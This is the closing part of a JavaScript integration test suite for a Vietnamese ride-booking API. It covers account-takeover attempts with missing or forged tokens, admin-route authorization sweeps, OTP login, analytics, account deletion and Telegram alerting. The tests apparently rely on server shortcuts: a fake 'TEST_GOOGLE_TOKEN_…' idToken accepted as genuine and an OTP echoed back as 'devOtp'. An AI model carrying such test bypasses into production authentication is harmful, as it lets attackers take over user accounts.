    assert(confirmData.data.driverConfirmed === true, 'Driver 1-Tap: Cờ driverConfirmed được bật true');

    // Kiểm tra lại qua public-summary
    const summaryAfterConfirm = await fetch(`${BASE_URL}/api/bookings/${testCode}/public-summary`).then((r) =>
      r.json()
    );
    assert(
      summaryAfterConfirm.data.driverConfirmed === true,
      'Đồng bộ: Hành khách và Bác tài đều thấy trạng thái đã xác nhận đón'
    );

    // Dọn dẹp booking test
    await fetch(`${BASE_URL}/api/bookings/${testCode}/cancel`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${sharedTokenA}`
      },
      body: JSON.stringify({ reason: 'Dọn dẹp test' })
    }).catch(() => {});
  } catch (err) {
    assert(false, 'Kịch bản Pentest & TTL', err.message);
  }

  // 22. Pentest Chống Chiếm Đoạt Tài Khoản (Account Takeover Protection) & Hiệu Năng Index Email
  console.log('\n--- 22. Pentest Chống Chiếm Đoạt Tài Khoản (Zalo/Google) & Hiệu Năng Index Email ---');
  try {
    // 22.1 Pentest Zalo Login: Kẻ tấn công gửi số điện thoại của nạn nhân mà KHÔNG CÓ TOKEN
    const attackZaloNoTokenRes = await fetch(`${BASE_URL}/api/auth/zalo-login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone: '0988112233' })
    });
    assert(
      attackZaloNoTokenRes.status === 401,
      'Pentest Zalo 1: Chặn đứng mạo danh số điện thoại khi không có token (Bắt buộc HTTP 401)'
    );

    // 22.2 Pentest Zalo Login: Kẻ tấn công gửi token giả mạo
    const attackZaloFakeTokenRes = await fetch(`${BASE_URL}/api/auth/zalo-login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: 'fake_forged_zalo_token_xyz', phone: '0988112233' })
    });
    assert(
      attackZaloFakeTokenRes.status === 401,
      'Pentest Zalo 2: Chặn token giả mạo từ chối cấp quyền (Bắt buộc HTTP 401)'
    );

    // 22.3 Pentest Google Login: Kẻ tấn công gửi email nạn nhân mà KHÔNG CÓ ID TOKEN
    const attackGgNoTokenRes = await fetch(`${BASE_URL}/api/auth/google-login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'victim@gmail.com', googleId: '123456789' })
    });
    assert(
      attackGgNoTokenRes.status === 401,
      'Pentest Google 1: Chặn đứng mạo danh email Google khi không có idToken (Bắt buộc HTTP 401)'
    );

    // 22.4 Pentest Google Login: Kẻ tấn công gửi idToken giả
    const attackGgFakeTokenRes = await fetch(`${BASE_URL}/api/auth/google-login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ idToken: 'fake_google_id_token_xyz', email: 'victim@gmail.com' })
    });
    assert(attackGgFakeTokenRes.status === 401, 'Pentest Google 2: Chặn token Google không hợp lệ (Bắt buộc HTTP 401)');

    // 22.5 Đăng nhập Google chính chủ thành công với Token hợp lệ
    const validGgRes = await fetch(`${BASE_URL}/api/auth/google-login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        idToken: 'TEST_GOOGLE_TOKEN_huynhnguyen.dev@gmail.com:gg_sub_998877',
        name: 'Huỳnh Nguyễn Google User'
      })
    });
    const validGgData = await validGgRes.json();
    assert(
      validGgRes.status === 200 && validGgData.success === true,
      'Google Login: Đăng nhập chính chủ thành công (HTTP 200)'
    );
    assert(typeof validGgData.token === 'string', 'Google Login: Cấp mã JWT Token bảo mật');
    assert(
      validGgData.user.email === 'huynhnguyen.dev@gmail.com',
      'Google Login: Email người dùng được trích xuất an toàn từ token'
    );

    // 22.6 Kiểm tra Request ID Correlation Header (Observability & Easy to Debug)
    const traceRes = await fetch(`${BASE_URL}/api/health`, {
      headers: { 'x-request-id': 'test-trace-uuid-123456' }
    });
    assert(
      traceRes.headers.get('x-request-id') === 'test-trace-uuid-123456',
      'Observability: Header x-request-id được phản hồi và bảo toàn xuyên suốt'
    );

    // 22.7 Kiểm tra An Toàn Luồng OTP Phone
    const otpReqRes = await fetch(`${BASE_URL}/api/auth/request-otp`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone: '0977223344' })
    });
    const otpReqData = await otpReqRes.json();
    assert(otpReqRes.status === 200 && otpReqData.success === true, 'OTP Flow: Gửi mã OTP SMS thành công');

    // Gửi sai OTP -> phải 400
    const wrongOtpRes = await fetch(`${BASE_URL}/api/auth/verify-otp`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone: '0977223344', otp: '000000' })
    });
    assert(wrongOtpRes.status === 400, 'OTP Flow: Mã OTP sai bị từ chối chính xác (HTTP 400)');

    // Gửi đúng OTP
    const correctOtp = otpReqData.devOtp || '123456';
    const validOtpRes = await fetch(`${BASE_URL}/api/auth/verify-otp`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone: '0977223344', otp: correctOtp, name: 'Người Dùng OTP Test' })
    });
    const validOtpData = await validOtpRes.json();
    assert(validOtpRes.status === 200 && validOtpData.success === true, 'OTP Flow: Xác thực OTP thành công và cấp JWT');
    assert(validOtpData.user.phone === '0977223344', 'OTP Flow: Số điện thoại được kích hoạt chính xác');
  } catch (err) {
    assert(false, '22. Pentest Chống Chiếm Đoạt Tài Khoản & Index Email', err.message);
  }

  console.log('\n--- 23. Kiểm thử Analytics & Phễu Chuyển Đổi (Zero-Cost Funnel Store) ---');
  try {
    // 1. Ghi nhận sự kiện hợp lệ
    const evtRes = await fetch(`${BASE_URL}/api/analytics/event`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        eventName: 'search_route',
        properties: { route: 'Sài Gòn - Bù Đốp', from: 'Sài Gòn', to: 'Bù Đốp' },
        userId: 'user_test_analytics'
      })
    });
    const evtData = await evtRes.json();
    assert(evtRes.status === 201 && evtData.success === true, 'Analytics 1: Ghi nhận sự kiện thành công (HTTP 201)');

    // 2. Chặn eventName rỗng
    const emptyEvtRes = await fetch(`${BASE_URL}/api/analytics/event`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ eventName: '' })
    });
    assert(emptyEvtRes.status === 400, 'Analytics 2: Chặn eventName rỗng (HTTP 400)');

    // 3. Ghi nhận các bước khác trong phễu
    await fetch(`${BASE_URL}/api/analytics/event`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        eventName: 'view_trip',
        properties: { tripId: 'DRV-TEST', route: 'Sài Gòn - Bù Đốp' }
      })
    });
    await fetch(`${BASE_URL}/api/analytics/event`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        eventName: 'initiate_booking',
        properties: { tripId: 'DRV-TEST', seats: 2 }
      })
    });
    await fetch(`${BASE_URL}/api/analytics/event`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        eventName: 'open_zalo',
        properties: { tripId: 'DRV-TEST', role: 'passenger' }
      })
    });

    // 4a. PII/BOLA: tổng quan phễu KHÔNG được lộ cho khách vãng lai (không token)
    const summaryNoAuth = await fetch(`${BASE_URL}/api/admin/analytics/summary`);
    assert(
      summaryNoAuth.status === 401 || summaryNoAuth.status === 403,
      'Analytics 2b: Chặn tổng quan phễu khi không có quyền Admin (BOLA 401/403)'
    );

    // 4b. Lấy thống kê phễu chuyển đổi bằng quyền Admin
    const adminAuthForAnalytics = await fetch(`${BASE_URL}/api/admin/auth`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ passcode: ADMIN_PASSCODE })
    });
    const analyticsAdminToken = (await adminAuthForAnalytics.json()).token;
    const summaryRes = await fetch(`${BASE_URL}/api/admin/analytics/summary`, {
      headers: { 'x-admin-key': analyticsAdminToken }
    });
    const summaryData = await summaryRes.json();
    assert(
      summaryRes.status === 200 && summaryData.success === true,
      'Analytics 3: Tải tổng quan phễu chuyển đổi thành công (HTTP 200)'
    );
    assert(summaryData.data.totalEvents >= 4, 'Analytics 4: Đếm đúng tổng số sự kiện trong SQLite');
    assert(typeof summaryData.data.funnel === 'object', 'Analytics 5: Báo cáo đầy đủ các chỉ số phễu');
    assert(summaryData.data.funnel.search_route >= 1, 'Analytics 6: Đếm chính xác sự kiện search_route');
    assert(summaryData.data.funnel.initiate_booking >= 1, 'Analytics 7: Đếm chính xác sự kiện initiate_booking');
    assert(Array.isArray(summaryData.data.topRoutes), 'Analytics 8: Tổng hợp danh sách Top tuyến xe được tìm kiếm');
    assert(Array.isArray(summaryData.data.recentEvents), 'Analytics 9: Lưu trữ danh sách sự kiện gần nhất');
  } catch (err) {
    assert(false, '23. Kiểm thử Analytics & Phễu Chuyển Đổi', err.message);
  }

  console.log('\n--- 24. Kiểm thử Xóa Tài Khoản Vĩnh Viễn (Apple Guideline 5.1.1 v & NĐ 13/2023) ---');
  try {
    // 1. Chặn xóa khi chưa đăng nhập (Bắt buộc HTTP 401)
    const unauthorizedDel = await fetch(`${BASE_URL}/api/auth/me`, { method: 'DELETE' });
    assert(unauthorizedDel.status === 401, 'Delete Account 1: Chặn xóa tài khoản khi không có token (HTTP 401)');

    // 2. Tạo một tài khoản người dùng test chuyên biệt
    const testPhone = '0988556677';
    const otpRes = await fetch(`${BASE_URL}/api/auth/request-otp`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone: testPhone })
    });
    const otpData = await otpRes.json();
    const verifyRes = await fetch(`${BASE_URL}/api/auth/verify-otp`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone: testPhone, otp: otpData.devOtp || '123456', name: 'User To Delete' })
    });
    const verifyData = await verifyRes.json();
    const deleteToken = verifyData.token;
    assert(verifyRes.status === 200 && !!deleteToken, 'Delete Account 2: Khởi tạo tài khoản test thành công');

    // 3. Đăng 1 chuyến đi thuộc tài khoản này
    const postTripRes = await fetch(`${BASE_URL}/api/trips`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${deleteToken}`
      },
      body: JSON.stringify({
        type: 'driver_offer',
        from: 'Sài Gòn',
        to: 'Bình Phước',
        phoneReal: testPhone,
        userId: verifyData.user.id,
        price: 150000,
        routeCategory: 'QL13',
        timeSlot: 'morning'
      })
    });
    const postTripData = await postTripRes.json();
    const createdTripId = postTripData.data?.id;
    assert(postTripRes.status === 201 && !!createdTripId, 'Delete Account 3: Đăng chuyến thử nghiệm thành công');

    // 4. Gọi API Xóa vĩnh viễn tài khoản
    const delRes = await fetch(`${BASE_URL}/api/auth/me`, {
      method: 'DELETE',
      headers: {
        Authorization: `Bearer ${deleteToken}`
      }
    });
    const delData = await delRes.json();
    assert(
      delRes.status === 200 && delData.success === true,
      'Delete Account 4: Xóa vĩnh viễn tài khoản thành công (HTTP 200)'
    );

    // 5. Kiểm tra tài khoản đã bị xóa khỏi hệ thống
    const meAfterRes = await fetch(`${BASE_URL}/api/auth/me`, {
      headers: { Authorization: `Bearer ${deleteToken}` }
    });
    assert(meAfterRes.status === 404, 'Delete Account 5: Tài khoản không còn tồn tại trong hệ thống (HTTP 404)');

    // 6. Kiểm tra chuyến xe của user đã bị gỡ sạch khỏi sàn
    const tripCheckRes = await fetch(`${BASE_URL}/api/trips/${createdTripId}`);
    assert(tripCheckRes.status === 404, 'Delete Account 6: Toàn bộ bài đăng của tài khoản đã bị xóa sạch (HTTP 404)');
  } catch (err) {
    assert(false, '24. Kiểm thử Xóa Tài Khoản Vĩnh Viễn', err.message);
  }
  console.log('\n--- 25. Kiểm thử Phân Quyền Toàn Bộ Cổng Admin (Anti-BOLA Regression Guard) ---');
  // Quét MỌI route /admin/* (trừ /admin/auth là cổng đăng nhập): không token
  // đều phải bị chặn 401/403. Đây là lưới chống lỗ hổng "quên requireAdmin"
  // tái diễn mỗi khi thêm endpoint admin mới.
  try {
    const adminRoutes = [
      ['GET', '/api/admin/metrics'],
      ['GET', '/api/admin/trips'],
      ['GET', '/api/admin/users'],
      ['GET', '/api/admin/reports'],
      ['GET', '/api/admin/ai-intelligence'],
      ['GET', '/api/admin/analytics/summary'],
      ['PATCH', '/api/admin/trips/DRV-TEST/toggle-hide'],
      ['DELETE', '/api/admin/trips/DRV-TEST'],
      ['PATCH', '/api/admin/users/USR-TEST'],
      ['PATCH', '/api/admin/users/USR-TEST/status']
    ];

    let blockedCount = 0;
    for (const [method, path] of adminRoutes) {
      const res = await fetch(`${BASE_URL}${path}`, {
        method,
        headers: { 'Content-Type': 'application/json' },
        ...(method !== 'GET' ? { body: '{}' } : {})
      });
      const blocked = res.status === 401 || res.status === 403;
      assert(blocked, `Admin Guard: ${method} ${path} bị chặn khi không có quyền (nhận ${res.status})`);
      if (blocked) blockedCount += 1;
    }
    assert(
      blockedCount === adminRoutes.length,
      `Admin Guard: Toàn bộ ${adminRoutes.length} route admin đều yêu cầu xác thực`
    );
  } catch (err) {
    assert(false, '25. Kiểm thử Phân Quyền Toàn Bộ Cổng Admin', err.message);
  }

  // -------------------------------------------------------------
  // 26. Kiểm thử Hệ Thống Telegram Alerting (Kháng Lỗi & Chống Spam)
  // -------------------------------------------------------------
  console.log('\n--- 26. Kiểm thử Hệ Thống Telegram Alerting (Kháng Lỗi & Chống Spam) ---');
  try {
    const { sendTelegramMessage, sendSystemErrorAlert, sendBusinessAlert, _resetDeduplicationCache } =
      await import('../apps/api/src/utils/telegramAlert.js');

    // Test 1-3: Kháng lỗi khi chưa cấu hình token (Graceful No-Op)
    const originalToken = process.env.TELEGRAM_BOT_TOKEN;
    const originalChatId = process.env.TELEGRAM_LOG_CHAT_ID;

    delete process.env.TELEGRAM_BOT_TOKEN;
    delete process.env.TELEGRAM_LOG_CHAT_ID;

    const noopResult = await sendTelegramMessage('Test alert text');
    assert(noopResult === false, 'Telegram 1: Tự động bỏ qua an toàn khi chưa cấu hình token (không gây lỗi)');

    const errNoopResult = await sendSystemErrorAlert({ error: new Error('Test crash'), source: 'Unit Test' });
    assert(errNoopResult === false, 'Telegram 2: Báo lỗi hệ thống an toàn khi chưa có token');

    const bizNoopResult = await sendBusinessAlert({ title: 'Test Trip', details: { id: 'TRIP-123' } });
    assert(bizNoopResult === false, 'Telegram 3: Báo nghiệp vụ an toàn khi chưa có token');

    // Test 4-11: Cơ chế chống spam (Deduplication) khi có token
    _resetDeduplicationCache();
    process.env.TELEGRAM_BOT_TOKEN = 'mock_bot_token_test';
    process.env.TELEGRAM_LOG_CHAT_ID = 'mock_chat_id_test';

    // Mock fetch để kiểm tra logic định dạng và HTTP payload
    const originalFetch = globalThis.fetch;
    const dispatchedMessages = [];
    globalThis.fetch = async (url, opts) => {
      if (typeof url === 'string' && url.includes('api.telegram.org')) {
        const body = JSON.parse(opts.body);
        dispatchedMessages.push(body);
        return {
          ok: true,
          status: 200,
          json: async () => ({ ok: true }),
          text: async () => JSON.stringify({ ok: true })
        };
      }
      return originalFetch(url, opts);
    };

    // Lần 1: Bắn lỗi
    const firstDispatch = await sendSystemErrorAlert({
      error: new Error('Database connection timeout'),
      req: { method: 'GET', originalUrl: '/api/trips' },
      source: 'Test Engine'
    });
    assert(firstDispatch === true, 'Telegram 4: Gửi cảnh báo thành công qua Telegram API khi có cấu hình');
    assert(dispatchedMessages.length === 1, 'Telegram 5: Dispatch message nhận đúng 1 payload');
    assert(
      dispatchedMessages[0].text.includes('Database connection timeout'),
      'Telegram 6: Nội dung tin nhắn chứa đúng lỗi'
    );
    assert(dispatchedMessages[0].parse_mode === 'HTML', 'Telegram 7: Sử dụng định dạng HTML chuẩn');

    // Lần 2: Bắn lại đúng lỗi đó trong cùng 60s -> Phải bị chặn chống spam
    const secondDispatch = await sendSystemErrorAlert({
      error: new Error('Database connection timeout'),
      req: { method: 'GET', originalUrl: '/api/trips' },
      source: 'Test Engine'
    });
    assert(secondDispatch === false, 'Telegram 8: Tự động chặn tin nhắn trùng lặp liên tiếp trong 60s chống spam');
    assert(dispatchedMessages.length === 1, 'Telegram 9: Không tạo thêm tin nhắn rác lên Telegram');

    // Lần 3: Bắn lỗi khác hoặc path khác -> Phải được thông qua
    const thirdDispatch = await sendSystemErrorAlert({
      error: new Error('Different error message'),
      req: { method: 'POST', originalUrl: '/api/bookings' },
      source: 'Test Engine'
    });
    assert(thirdDispatch === true, 'Telegram 10: Cho phép lỗi mới khác biệt đi qua');
    assert(dispatchedMessages.length === 2, 'Telegram 11: Tổng số tin nhắn tăng lên 2');

    // Test 12-14: Thông báo nghiệp vụ mới
    const bizDispatch = await sendBusinessAlert({
      title: 'Bác tài đăng chuyến mới',
      details: {
        Mã: 'TRIP-TEST-999',
        'Lộ trình': 'Sài Gòn -> Bình Phước'
      }
    });
    assert(bizDispatch === true, 'Telegram 12: Gửi thông báo nghiệp vụ thành công');
    assert(dispatchedMessages.length === 3, 'Telegram 13: Tin nhắn nghiệp vụ được chuyển tới Telegram');
    assert(
      dispatchedMessages[2].text.includes('Bác tài đăng chuyến mới'),
      'Telegram 14: Tiêu đề nghiệp vụ hiển thị chính xác'
    );

    // Khôi phục môi trường
    globalThis.fetch = originalFetch;
    if (originalToken) process.env.TELEGRAM_BOT_TOKEN = originalToken;
    else delete process.env.TELEGRAM_BOT_TOKEN;
    if (originalChatId) process.env.TELEGRAM_LOG_CHAT_ID = originalChatId;
    else delete process.env.TELEGRAM_LOG_CHAT_ID;
    _resetDeduplicationCache();
  } catch (err) {
    assert(false, '26. Kiểm thử Hệ Thống Telegram Alerting', err.message);
  }

  const passed = results.filter((r) => r.pass).length;
  const failed = results.filter((r) => !r.pass).length;
  const total = results.length;
  console.log(`Tổng số bài test: ${total}`);
  console.log(`Số bài ĐẠT (PASS): ${passed} / ${total} (${Math.round((passed / total) * 100)}%)`);
  console.log(`Số bài LỖI (FAIL): ${failed}`);

  if (failed === 0) {
    console.log('\n🎉 TẤT CẢ CÁC TÍNH NĂNG CHẠY Ở LOCAL ĐỀU HOÀN TOÀN TỐT & ỔN ĐỊNH 100%!');
  } else {
    console.error(`\n⚠️ Có ${failed} bài test chưa đạt, vui lòng kiểm tra lại.`);
    process.exit(1);
  }
}

runTests();
